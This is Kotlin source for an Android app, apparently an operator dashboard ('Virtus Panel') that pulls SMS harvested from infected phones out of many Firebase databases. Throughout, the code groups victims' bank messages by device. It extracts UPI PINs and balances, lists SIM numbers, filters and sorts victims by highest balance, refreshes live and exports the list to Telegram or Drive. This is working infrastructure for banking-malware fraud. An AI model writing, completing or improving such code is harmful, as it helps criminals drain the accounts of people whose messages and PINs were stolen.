package com.firebasepanel.sms.ui

import android.app.Application
import android.content.Context
import android.content.Intent
import android.net.Uri
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.firebasepanel.sms.domain.ConnectionFilter
import com.firebasepanel.sms.domain.DeviceSnapshot
import com.firebasepanel.sms.domain.FetchResult
import com.firebasepanel.sms.domain.BalanceTier
import com.firebasepanel.sms.domain.FilterConfig
import com.firebasepanel.sms.domain.InboxMode
import com.firebasepanel.sms.domain.PinFilter
import com.firebasepanel.sms.domain.RawSms
import com.firebasepanel.sms.domain.SortMode
import com.firebasepanel.sms.domain.extractUpiPinDigitsFromSmsBodies
import com.firebasepanel.sms.domain.FirebasePanel
import com.firebasepanel.sms.domain.extractFirebasePanels
import com.firebasepanel.sms.domain.fetchManyParallel
import com.firebasepanel.sms.domain.mainBalanceForSort
import com.firebasepanel.sms.domain.messageHasPinText
import com.firebasepanel.sms.domain.messageWithinDays
import com.firebasepanel.sms.domain.passesInboxMode
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.LinkedHashSet

data class DeviceRow(
    val firebaseUrl: String,
    val deviceId: String,
    val online: Boolean,
    val deviceHasPin: Boolean,
    /** Shown like reference UI; from Firebase meta and/or SMS extraction */
    val upiPinDisplay: String,
    val modelDisplay: String,
    val batteryPercent: Int?,
    val sim1Display: String?,
    val sim2Display: String?,
    val lastSeenMillis: Long?,
    val registeredAtMillis: Long?,
    val forwarderDisplay: String?,
    val maxBalance: Double,
    val smsCount: Int,
    /** Unfiltered message count for this device (Virtus `23 / 1052` style). */
    val totalRawSms: Int,
    val lastActivityMillis: Long,
    val previewSender: String,
    /** Recent SMS body snippet for list card (green Virtus-style line). */
    val previewBody: String,
    /** Loaded from `clients/` only — bank filters hid all SMS but device still listed. */
    val fromClientsOnly: Boolean,
)

data class DeviceDetail(
    val firebaseUrl: String,
    val deviceId: String,
    val online: Boolean,
    val deviceHasPin: Boolean,
    val upiPinDisplay: String,
    val modelDisplay: String,
    val batteryPercent: Int?,
    val sim1Display: String?,
    val sim2Display: String?,
    val lastSeenMillis: Long?,
    val registeredAtMillis: Long?,
    val forwarderDisplay: String?,
    /** Max bank balance from filtered SMS (same as list badge). */
    val maxBalanceDisplay: Double,
    val messages: List<SmsRow>,
)

data class SmsRow(
    val sender: String,
    val body: String,
    val balance: Double?,
    val messageAtMillis: Long?,
    val hasPinText: Boolean,
    val kindLabel: String,
)

/** Compact row for dashboard live SMS strip (all filtered devices). */
data class LiveSmsRow(
    val deviceId: String,
    val firebaseUrl: String,
    val sender: String,
    val body: String,
    val balance: Double?,
    val messageAtMillis: Long?,
    val online: Boolean,
    val kindLabel: String,
)

data class UiState(
    val urlsLoaded: Int = 0,
    val fetching: Boolean = false,
    val progress: String = "",
    val lastFetchEpochMs: Long = 0L,
    /** Total SMS rows last fetch (before filters). */
    val lastFetchTotalSms: Int = 0,
    /** When filters hide everything but SMS loaded — short hint for user. */
    val filterEmptyHint: String? = null,
    val autoLiveRefresh: Boolean = false,
    val devices: List<DeviceRow> = emptyList(),
    val selected: DeviceDetail? = null,
    val error: String? = null,
    val searchQuery: String = "",
    val liveFeedSms: List<LiveSmsRow> = emptyList(),
    val config: FilterConfig =
        FilterConfig(
            sortMode = SortMode.HIGH_TO_LOW,
            pinFilter = PinFilter.BOTH,
            /** Both = show panels even when HTTP reports offline (many DBs still have SMS). */
            connection = ConnectionFilter.BOTH,
            days = null,
            inboxMode = InboxMode.BANK_FILTERED,
            balanceTier = BalanceTier.HIGH_1L_20L,
            sortByBattery = false,
        ),
)

class PanelViewModel(application: Application) : AndroidViewModel(application) {
    private val _state = MutableStateFlow(UiState())
    val state: StateFlow<UiState> = _state.asStateFlow()

    private var lastResults: List<FetchResult> = emptyList()
    private var storedPanels: List<FirebasePanel> = emptyList()
    private var liveJob: Job? = null

    fun updateConfig(block: (FilterConfig) -> FilterConfig) {
        _state.update { it.copy(config = block(it.config)) }
        applyFilters()
    }

    fun setSearchQuery(q: String) {
        _state.update { it.copy(searchQuery = q) }
        applyFilters()
    }

    fun setInboxMode(mode: InboxMode) {
        _state.update { it.copy(config = it.config.copy(inboxMode = mode)) }
        applyFilters()
    }

    fun setAutoLiveRefresh(enabled: Boolean) {
        _state.update { it.copy(autoLiveRefresh = enabled) }
        liveJob?.cancel()
        if (enabled && storedPanels.isNotEmpty()) {
            liveJob =
                viewModelScope.launch {
                    while (isActive) {
                        delay(45_000L)
                        fetchAndCompute(storedPanels)
                    }
                }
        }
    }

    fun loadUrlsFromTxt(context: Context, uri: Uri) {
        viewModelScope.launch {
            try {
                val text =
                    context.contentResolver.openInputStream(uri)?.use { stream ->
                        BufferedReader(InputStreamReader(stream)).readText()
                    } ?: ""
                val panels = extractFirebasePanels(text)
                val withoutKey = panels.count { it.authKey.isBlank() }
                _state.update {
                    it.copy(urlsLoaded = panels.size, progress = "${panels.size} panels (Virtus TXT)", error = null)
                }
                if (panels.isEmpty()) {
                    _state.update { it.copy(error = "TXT me koi Firebase URL nahi mila") }
                    return@launch
                }
                storedPanels = panels
                lastResults = emptyList()
                _state.update {
                    it.copy(
                        progress =
                            buildString {
                                append("Ready: ${panels.size} panels")
                                if (withoutKey > 0) append(" — ⚠️ $withoutKey bina Auth Key (Virtus format: URL + KEY lines)")
                                append(" — Start Fetch / Fetch Live")
                            },
                        devices = emptyList(),
                        liveFeedSms = emptyList(),
                        selected = null,
                        lastFetchEpochMs = 0L,
                        lastFetchTotalSms = 0,
                        filterEmptyHint = null,
                        error = null,
                    )
                }
                applyFilters()
            } catch (e: Exception) {
                _state.update { it.copy(error = e.message ?: "read fail") }
            }
        }
    }

    fun refreshNow() {
        if (storedPanels.isEmpty()) return
        viewModelScope.launch { fetchAndCompute(storedPanels) }
    }

    private suspend fun fetchAndCompute(panels: List<FirebasePanel>) {
        storedPanels = panels
        _state.update {
            it.copy(
                fetching = true,
                progress = "Fetching ${panels.size} panels (clients + messages)…",
                devices = emptyList(),
                liveFeedSms = emptyList(),
                selected = null,
                filterEmptyHint = null,
                error = null,
            )
        }
        val results = fetchManyParallel(panels, concurrency = 6)
        lastResults = results
        val totalSms = results.sumOf { it.sms.size }
        val panelsHit = results.count { it.sms.isNotEmpty() }
        val authHits = results.count { it.usedAuth }
        _state.update {
            it.copy(
                fetching = false,
                progress =
                    buildString {
                        append("Done ${results.count { r -> r.online }} online / ${results.size} panels")
                        append(" · $totalSms SMS")
                        if (authHits > 0) append(" (Virtus auth: $authHits)")
                        if (panelsHit < results.size) append(" · data: $panelsHit panels")
                    },
                lastFetchEpochMs = System.currentTimeMillis(),
                lastFetchTotalSms = totalSms,
            )
        }
        applyFilters()
    }

    fun applyFilters() {
        val cfg = _state.value.config
        val q = _state.value.searchQuery.trim().lowercase()
        val devices = buildDeviceList(lastResults, cfg, q)
        val liveFeed = buildLiveFeedList(lastResults, cfg, q)
        val totalSms = lastResults.sumOf { it.sms.size }
        val hint =
            if (totalSms > 0 && devices.isEmpty() && liveFeed.isEmpty() && q.isEmpty()) {
                "Firebase se $totalSms SMS aaye, lekin filters sab hide kar rahe — " +
                    "Connection → Both, Mode → Full inbox, ya SMS age → All try karo."
            } else {
                null
            }
        _state.update {
            it.copy(devices = devices, liveFeedSms = liveFeed, selected = null, filterEmptyHint = hint)
        }
    }

    fun selectDevice(row: DeviceRow) {
        val cfg = _state.value.config
        val detail = buildDeviceDetail(lastResults, row, cfg)
        _state.update { it.copy(selected = detail) }
    }

    /** Share current device list as plain text (Drive, Telegram, etc.). */
    fun exportDeviceListTxt() {
        val list = _state.value.devices
        if (list.isEmpty()) return
        val text =
            buildString {
                appendLine("Virtus Panel — devices (${list.size})")
                appendLine()
                list.forEachIndexed { i, d ->
                    val pin = if (d.deviceHasPin) "PIN" else "—"
                    appendLine(
                        "${i + 1}. ${d.modelDisplay}  |  ${d.deviceId}  |  ${if (d.online) "ON" else "OFF"}  |  UPI PIN ${d.upiPinDisplay}  |  ${d.batteryPercent ?: "—"}%  |  max ₹${d.maxBalance.toLong()}  |  ${d.smsCount} SMS",
                    )
                    appendLine("   ${d.firebaseUrl}")
                    appendLine()
                }
            }
        val app = getApplication<Application>()
        val send =
            Intent(Intent.ACTION_SEND).apply {
                type = "text/plain"
                putExtra(Intent.EXTRA_TEXT, text)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
        val chooser = Intent.createChooser(send, "Export TXT").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        app.startActivity(chooser)
    }

    fun clearSelection() {
        _state.update { it.copy(selected = null) }
    }

    override fun onCleared() {
        liveJob?.cancel()
        super.onCleared()
    }
}

/**
 * Virtus / Firebase paths look like `messages/<deviceId>/<pushKey>/...`.
 * The device id is the segment **after** `messages`/`sms`/`inbox`, not the leaf key.
 */
private fun deviceIdFromPath(path: String): String {
    val parts = path.split("/").filter { it.isNotEmpty() }
    if (parts.isEmpty()) return "unknown"
    val li = parts.map { it.lowercase() }
    val di = li.indexOf("devices")
    if (di >= 0 && di + 1 < parts.size) return parts[di + 1]
    val mi = li.indexOfFirst { it in setOf("messages", "sms", "inbox") }
    if (mi >= 0 && mi + 1 < parts.size) return parts[mi + 1]
    return parts.lastOrNull() ?: "unknown"
}

private fun deviceHasPinMessages(messages: List<RawSms>): Boolean = messages.any { messageHasPinText(it.body) }

private fun resolveUpiPin(msgs: List<RawSms>, snap: DeviceSnapshot?): String {
    val fromMeta = snap?.metadataUpiPin?.trim()
    if (!fromMeta.isNullOrEmpty() && !fromMeta.equals("N/A", true)) return fromMeta
    val fromSms = extractUpiPinDigitsFromSmsBodies(msgs.map { it.body })
    return fromSms ?: "N/A"
}

private fun deviceHasPinResolved(
    msgs: List<RawSms>,
    snap: DeviceSnapshot?,
): Boolean {
    if (deviceHasPinMessages(msgs)) return true
    val pin = resolveUpiPin(msgs, snap)
    return pin != "N/A"
}

private fun pinOkForDevice(deviceHasPin: Boolean, filter: PinFilter, inbox: InboxMode): Boolean {
    if (inbox == InboxMode.OTP_AND_ALERTS || inbox == InboxMode.FULL_INBOX) return true
    return when (filter) {
        PinFilter.BOTH -> true
        PinFilter.WITH -> deviceHasPin
        PinFilter.WITHOUT -> !deviceHasPin
    }
}

private fun connectionOk(online: Boolean, filter: ConnectionFilter): Boolean {
    return when (filter) {
        ConnectionFilter.ONLINE -> online
        ConnectionFilter.OFFLINE -> !online
        ConnectionFilter.BOTH -> true
    }
}

private fun filterSmsList(list: List<RawSms>, cfg: FilterConfig): List<RawSms> {
    return list.filter { sms ->
        if (!passesInboxMode(sms.body, sms.sender, cfg)) return@filter false
        messageWithinDays(sms.messageAtMillis, sms.body, cfg.days)
    }
}

private fun smsKindLabel(cfg: FilterConfig): String {
    return when (cfg.inboxMode) {
        InboxMode.OTP_AND_ALERTS -> "OTP / Alert"
        InboxMode.FULL_INBOX -> "Inbox"
        InboxMode.BANK_ALL, InboxMode.BANK_FILTERED -> "Bank"
    }
}

private fun matchesSearch(
    devId: String,
    firebaseUrl: String,
    msgs: List<RawSms>,
    snap: DeviceSnapshot?,
    query: String,
): Boolean {
    if (query.isEmpty()) return true
    if (devId.lowercase().contains(query)) return true
    if (firebaseUrl.lowercase().contains(query)) return true
    val model = snap?.model?.lowercase() ?: ""
    if (model.contains(query)) return true
    val s1 = snap?.sim1?.lowercase() ?: ""
    val s2 = snap?.sim2?.lowercase() ?: ""
    if (s1.contains(query) || s2.contains(query)) return true
    return msgs.any { sms ->
        sms.sender.lowercase().contains(query) || sms.body.lowercase().contains(query)
    }
}

private fun buildDeviceList(
    results: List<FetchResult>,
    cfg: FilterConfig,
    searchQuery: String,
): List<DeviceRow> {
    val q = searchQuery.trim().lowercase()
    val rows = mutableListOf<DeviceRow>()
    for (fr in results) {
        val byDev = fr.sms.groupBy { deviceIdFromPath(it.rawPath) }
        val allDevIds = LinkedHashSet<String>().apply {
            addAll(byDev.keys)
            addAll(fr.devices.keys)
        }
        for (devId in allDevIds) {
            val msgs = byDev[devId].orEmpty()
            val snap = fr.devices[devId]
            val devicePin = deviceHasPinResolved(msgs, snap)
            if (!pinOkForDevice(devicePin, cfg.pinFilter, cfg.inboxMode)) continue
            if (!matchesSearch(devId, fr.url, msgs, snap, q)) continue
            val filtered = filterSmsList(msgs, cfg)
            val fromClientsOnly = filtered.isEmpty() && msgs.isEmpty() && snap != null
            if (filtered.isEmpty()) {
                if (msgs.isNotEmpty()) continue
                if (!fromClientsOnly) continue
            }
            val deviceOnline = snap?.clientOnline ?: fr.online
            if (!connectionOk(deviceOnline, cfg.connection)) continue
            val balances = filtered.mapNotNull { mainBalanceForSort(it.body) }
            val maxBal = balances.maxOrNull() ?: 0.0
            val times = filtered.mapNotNull { it.messageAtMillis }
            val lastAct = times.maxOrNull() ?: (snap?.lastSeenMillis ?: 0L)
            val previewSms = filtered.maxByOrNull { it.messageAtMillis ?: 0L }
            val preview = previewSms?.sender?.ifBlank { "(sender)" } ?: ""
            val rawBody = previewSms?.body?.trim().orEmpty()
            val previewBody =
                when {
                    rawBody.isEmpty() -> ""
                    rawBody.length > 160 -> rawBody.take(157) + "…"
                    else -> rawBody
                }
            val upiPin = resolveUpiPin(msgs, snap)
            val model =
                snap?.model?.takeIf { it.isNotBlank() }
                    ?: devId
            val batt = snap?.batteryPercent
            val lastSeen = listOfNotNull(snap?.lastSeenMillis, lastAct).maxOrNull()
            rows.add(
                DeviceRow(
                    firebaseUrl = fr.url,
                    deviceId = devId,
                    online = deviceOnline,
                    deviceHasPin = devicePin,
                    upiPinDisplay = upiPin,
                    modelDisplay = model,
                    batteryPercent = batt,
                    sim1Display = snap?.sim1?.takeIf { it.isNotBlank() },
                    sim2Display = snap?.sim2?.takeIf { it.isNotBlank() },
                    lastSeenMillis = lastSeen,
                    registeredAtMillis = snap?.registeredAtMillis,
                    forwarderDisplay = snap?.forwarder?.takeIf { it.isNotBlank() },
                    maxBalance = maxBal,
                    smsCount = filtered.size,
                    totalRawSms = msgs.size,
                    lastActivityMillis = lastAct,
                    previewSender = preview,
                    previewBody = if (fromClientsOnly) "" else previewBody,
                    fromClientsOnly = fromClientsOnly,
                ),
            )
        }
    }
    val bankSort = cfg.inboxMode == InboxMode.BANK_FILTERED || cfg.inboxMode == InboxMode.BANK_ALL
    return when {
        bankSort && cfg.sortByBattery ->
            when (cfg.sortMode) {
                SortMode.HIGH_TO_LOW -> rows.sortedByDescending { it.batteryPercent ?: -1 }
                SortMode.LOW_TO_HIGH -> rows.sortedBy { it.batteryPercent ?: 101 }
            }
        bankSort ->
            when (cfg.sortMode) {
                SortMode.HIGH_TO_LOW -> rows.sortedByDescending { it.maxBalance }
                SortMode.LOW_TO_HIGH -> rows.sortedBy { it.maxBalance }
            }
        else -> rows.sortedByDescending { it.lastActivityMillis }
    }
}

/** Recent SMS across all devices that pass filters + search (for live strip). */
private fun buildLiveFeedList(
    results: List<FetchResult>,
    cfg: FilterConfig,
    searchQuery: String,
    cap: Int = 60,
): List<LiveSmsRow> {
    val q = searchQuery.trim().lowercase()
    val out = mutableListOf<LiveSmsRow>()
    val label = smsKindLabel(cfg)
    for (fr in results) {
        val byDev = fr.sms.groupBy { deviceIdFromPath(it.rawPath) }
        for ((devId, msgs) in byDev) {
            val snap = fr.devices[devId]
            val deviceOnline = snap?.clientOnline ?: fr.online
            if (!connectionOk(deviceOnline, cfg.connection)) continue
            val devicePin = deviceHasPinResolved(msgs, snap)
            if (!pinOkForDevice(devicePin, cfg.pinFilter, cfg.inboxMode)) continue
            if (!matchesSearch(devId, fr.url, msgs, snap, q)) continue
            val filtered = filterSmsList(msgs, cfg)
            for (sms in filtered) {
                out.add(
                    LiveSmsRow(
                        deviceId = devId,
                        firebaseUrl = fr.url,
                        sender = sms.sender.ifBlank { "(unknown)" },
                        body = sms.body,
                        balance = mainBalanceForSort(sms.body),
                        messageAtMillis = sms.messageAtMillis,
                        online = deviceOnline,
                        kindLabel = label,
                    ),
                )
            }
        }
    }
    return out
        .sortedByDescending { it.messageAtMillis ?: 0L }
        .take(cap)
}

private fun buildDeviceDetail(results: List<FetchResult>, row: DeviceRow, cfg: FilterConfig): DeviceDetail? {
    val fr = results.find { it.url == row.firebaseUrl } ?: return null
    val msgs = fr.sms.filter { deviceIdFromPath(it.rawPath) == row.deviceId }
    val snap = fr.devices[row.deviceId]
    val devicePin = deviceHasPinResolved(msgs, snap)
    val filtered = filterSmsList(msgs, cfg)
    val smsRows =
        filtered.map { s ->
            SmsRow(
                sender = s.sender.ifBlank { "(unknown sender)" },
                body = s.body,
                balance = mainBalanceForSort(s.body),
                messageAtMillis = s.messageAtMillis,
                hasPinText = messageHasPinText(s.body),
                kindLabel = smsKindLabel(cfg),
            )
        }
    val ordered =
        when {
            cfg.inboxMode == InboxMode.BANK_FILTERED || cfg.inboxMode == InboxMode.BANK_ALL ->
                when (cfg.sortMode) {
                    SortMode.HIGH_TO_LOW -> smsRows.sortedByDescending { it.balance ?: 0.0 }
                    SortMode.LOW_TO_HIGH -> smsRows.sortedBy { it.balance ?: Double.MAX_VALUE }
                }
            else -> smsRows.sortedByDescending { it.messageAtMillis ?: 0L }
        }
    return DeviceDetail(
        firebaseUrl = row.firebaseUrl,
        deviceId = row.deviceId,
        online = row.online,
        deviceHasPin = devicePin,
        upiPinDisplay = resolveUpiPin(msgs, snap),
        modelDisplay = row.modelDisplay,
        batteryPercent = row.batteryPercent,
        sim1Display = row.sim1Display,
        sim2Display = row.sim2Display,
        lastSeenMillis = row.lastSeenMillis,
        registeredAtMillis = row.registeredAtMillis,
        forwarderDisplay = row.forwarderDisplay,
        maxBalanceDisplay = row.maxBalance,
        messages = ordered,
    )
}
